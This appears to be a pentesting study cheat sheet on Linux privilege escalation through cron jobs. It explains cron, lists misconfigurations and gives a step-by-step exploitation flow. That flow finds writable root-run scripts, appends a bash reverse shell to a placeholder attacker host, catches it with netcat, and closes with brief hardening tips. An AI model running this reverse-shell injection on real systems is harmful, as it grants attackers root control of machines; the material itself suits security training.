## Cron Job Abuse – Cheatsheet

|Command / File|Use|
|---|---|
|`crontab -l`|List current user’s cron jobs|
|`crontab -e`|Edit user’s cron jobs|
|`ls -la /etc/cron.*`|Check system-wide scheduled jobs|
|`cat /etc/crontab`|View system cron file|
|`ls -la /etc/cron.d/`|Check custom cron job definitions|
|`find / -type f -perm -o+w 2>/dev/null`|Find world-writable files (possible cron targets)|
|`find / -type f -name "*.sh" -writable 2>/dev/null`|Find writable scripts|
|`pspy64 -pf -i 1000`|Monitor processes & cron execution without root|
|`echo "bash -i >& /dev/tcp/IP/PORT 0>&1" >> file.sh`|Append reverse shell to writable cron script|
|`chmod +x file.sh`|Ensure script is executable|
|`nc -lnvp PORT`|Start listener for reverse shell|
|`grep -R "CRON" /var/log`|Check cron execution logs|

---

### 1. What is Cron?

- Cron is a Linux scheduler that runs tasks automatically at fixed time intervals.
    
- Configured via **crontab files**.
    

Format:

```
minute hour day month weekday command
```

Example:

```
0 */12 * * * /home/admin/backup.sh
```

→ runs every 12 hours.

---

### 2. Where Cron Jobs Exist

- User crontabs:  
    `/var/spool/cron/` or `crontab -e`
    
- System-wide:
    
    - `/etc/crontab`
        
    - `/etc/cron.d/`
        
    - `/etc/cron.daily/`, `/hourly/`, `/weekly/`, `/monthly/`
        

---

### 3. Why Cron Jobs Become a Privilege Escalation Vector

Cron jobs run with **owner privileges** (often root).

If a script executed by root is:

- writable by low-privileged users
    
- misconfigured
    
- or in a writable directory
    

→ attacker can inject commands → root execution.

---

### 4. Key Misconfigurations to Look For

- World-writable scripts (`-rwxrwxrwx`)
    
- Scripts inside cron directories that are editable
    
- Backup scripts running as root
    
- Incorrect scheduling (e.g., every minute instead of every hour)
    
- PATH manipulation vulnerabilities (cron uses insecure PATH)
    

---

### 5. Exploitation Flow

1. Identify writable files:
    
    ```
    find / -type f -perm -o+w 2>/dev/null
    ```
    
2. Detect cron activity:
    
    ```
    pspy64 -pf -i 1000
    ```
    
3. Find a script executed by root (e.g., backup.sh)
    
4. Append payload:
    
    ```bash
    echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> backup.sh
    ```
    
5. Start listener:
    
    ```
    nc -lnvp PORT
    ```
    
6. Wait for cron execution → root shell
    

---

### 6. Using pspy (Important)

- Works without root
    
- Shows real-time process execution
    
- Helps confirm:
    
    - cron job timing
        
    - scripts executed by root
        
    - hidden automation tasks
        

---


---

### 8. Defense Idea (Good to know)

- Never make cron scripts world-writable
    
- Use strict permissions:
    
    ```
    chmod 700 script.sh
    ```
